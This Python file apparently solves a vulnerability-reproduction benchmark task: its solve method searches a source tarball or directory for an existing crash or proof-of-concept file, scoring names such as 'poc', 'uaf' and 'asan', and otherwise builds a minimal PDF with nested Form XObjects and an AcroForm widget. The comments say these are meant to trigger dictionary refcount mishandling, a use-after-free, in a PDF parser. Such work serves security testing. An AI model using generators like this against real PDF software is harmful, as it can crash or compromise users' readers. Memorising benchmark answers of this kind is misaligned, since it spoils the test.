import os
import re
import tarfile
from pathlib import Path
from typing import Iterable, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._find_existing_poc(src_path)
        if data is not None:
            return data
        return self._make_min_pdf_form_uaf()

    def _find_existing_poc(self, src_path: str) -> Optional[bytes]:
        p = Path(src_path)
        if p.is_file() and tarfile.is_tarfile(str(p)):
            try:
                return self._scan_tar_for_poc(str(p))
            except Exception:
                return None
        if p.is_dir():
            try:
                return self._scan_dir_for_poc(p)
            except Exception:
                return None
        return None

    def _scan_tar_for_poc(self, tar_path: str) -> Optional[bytes]:
        best: Optional[Tuple[int, int, bytes]] = None  # (score, size, data)
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                name = m.name
                bn = os.path.basename(name).lower()
                if bn.endswith((".o", ".a", ".so", ".dll", ".exe", ".obj", ".class", ".jar", ".pyc")):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                sc = self._score_candidate(name, data)
                if sc <= 0:
                    continue
                cand = (sc, len(data), data)
                if best is None:
                    best = cand
                else:
                    if cand[0] > best[0] or (cand[0] == best[0] and cand[1] < best[1]):
                        best = cand
        if best is None:
            return None
        return best[2]

    def _scan_dir_for_poc(self, root: Path) -> Optional[bytes]:
        best: Optional[Tuple[int, int, bytes]] = None
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                p = Path(dirpath) / fn
                try:
                    st = p.stat()
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                name = str(p.relative_to(root)).replace("\\", "/")
                bn = fn.lower()
                if bn.endswith((".o", ".a", ".so", ".dll", ".exe", ".obj", ".class", ".jar", ".pyc")):
                    continue
                try:
                    data = p.read_bytes()
                except Exception:
                    continue
                sc = self._score_candidate(name, data)
                if sc <= 0:
                    continue
                cand = (sc, len(data), data)
                if best is None:
                    best = cand
                else:
                    if cand[0] > best[0] or (cand[0] == best[0] and cand[1] < best[1]):
                        best = cand
        if best is None:
            return None
        return best[2]

    def _score_candidate(self, name: str, data: bytes) -> int:
        n = name.lower().replace("\\", "/")
        bn = os.path.basename(n)

        score = 0
        if any(k in n for k in ("crash", "poc", "repro", "uaf", "asan", "ubsan", "msan")):
            score += 25
        if any(k in n for k in ("fuzz", "corpus", "seed", "test", "regress", "reproducers", "oss-fuzz")):
            score += 6

        ext = os.path.splitext(bn)[1]
        if ext in (".pdf", ".fdf", ".xfdf"):
            score += 18
        elif ext in (".bin", ".dat", ".in", ".input"):
            score += 4

        if data.startswith(b"%PDF-"):
            score += 30
        if b"/Subtype /Form" in data or b"/Subtype/Form" in data:
            score += 10
        if b"/AcroForm" in data:
            score += 8

        if score <= 0:
            return 0

        if len(data) < 64:
            score -= 10

        return score

    def _make_min_pdf_form_uaf(self) -> bytes:
        def stream_obj(dict_prefix: bytes, stream_data: bytes) -> bytes:
            return dict_prefix + b"/Length " + str(len(stream_data)).encode() + b" >>\nstream\n" + stream_data + b"endstream"

        # Form XObject 5: has its own direct Resources dict (key to trigger dict refcount mishandling)
        fm1_data = b"0 0 100 100 re S\n"
        fm1_dict = b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 100] /Resources << /ProcSet [/PDF] >> "
        obj5 = stream_obj(fm1_dict, fm1_data)

        # Form XObject 8: nested form, also has direct Resources dict
        fm2_data = b"q 10 10 80 80 re f Q\n"
        fm2_dict = b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 100] /Resources << /ProcSet [/PDF] >> "
        obj8 = stream_obj(fm2_dict, fm2_data)

        # Page content 4: invoke both forms
        content = b"q\n/Fm0 Do\n/Fm1 Do\nQ\n"
        obj4 = stream_obj(b"<< ", content)

        # Appearance stream 7: standalone form appearance, also has direct Resources dict
        ap_data = b"0 0 50 20 re f\n"
        ap_dict = b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 50 20] /Resources << /ProcSet [/PDF] >> "
        obj7 = stream_obj(ap_dict, ap_data)

        # Widget annotation 6 referencing appearance
        obj6 = b"<< /Type /Annot /Subtype /Widget /Rect [10 10 60 30] /F 4 /FT /Btn /T (a) /V /Off /AP << /N 7 0 R >> >>"

        # Page 3
        obj3 = (
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
            b"/Resources << /XObject << /Fm0 5 0 R /Fm1 8 0 R >> >> "
            b"/Contents 4 0 R /Annots [6 0 R] >>"
        )

        # Pages 2
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

        # Catalog 1 (direct AcroForm dict)
        obj1 = b"<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> >>"

        objects = [obj1, obj2, obj3, obj4, obj5, obj6, obj7, obj8]
        return self._build_pdf(objects)

    def _build_pdf(self, objects: Iterable[bytes]) -> bytes:
        objs = list(objects)
        out = bytearray()
        out += b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        offsets = [0]

        for i, obj in enumerate(objs, start=1):
            offsets.append(len(out))
            out += f"{i} 0 obj\n".encode()
            out += obj
            if not obj.endswith(b"\n"):
                out += b"\n"
            out += b"endobj\n"

        xref_off = len(out)
        out += f"xref\n0 {len(objs) + 1}\n".encode()
        out += b"0000000000 65535 f \n"
        for off in offsets[1:]:
            out += f"{off:010d} 00000 n \n".encode()

        out += b"trailer\n"
        out += f"<< /Size {len(objs) + 1} /Root 1 0 R >>\n".encode()
        out += b"startxref\n"
        out += f"{xref_off}\n".encode()
        out += b"%%EOF\n"
        return bytes(out)